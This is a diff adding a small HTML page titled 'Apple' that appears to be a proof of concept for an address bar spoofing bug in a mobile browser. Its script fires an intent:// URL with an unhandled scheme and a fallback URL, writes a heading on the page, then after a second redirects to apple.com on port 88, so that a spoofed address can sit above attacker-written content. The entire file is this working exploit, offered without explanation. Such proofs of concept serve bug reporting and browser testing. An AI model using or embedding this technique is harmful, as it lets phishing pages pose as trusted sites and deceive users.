@@ -1,0 +1,15 @@
+<!doctype html>
+<title>Apple</title>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<button onclick="go()">run</button>
+<script>
+var FB = new URLSearchParams(location.search).get('fb') || 'https://www.google.com/csi';
+function go(){
+  location.href = "intent://x/#Intent;scheme=zxqnoapphandler;S.browser_fallback_url="+encodeURIComponent(FB)+";end";
+  document.write('<h1>Address Bar Spoofing')
+  
+    setTimeout(() => {
+        location.replace('https://apple.com:88');
+    },1000)
+}
+</script>
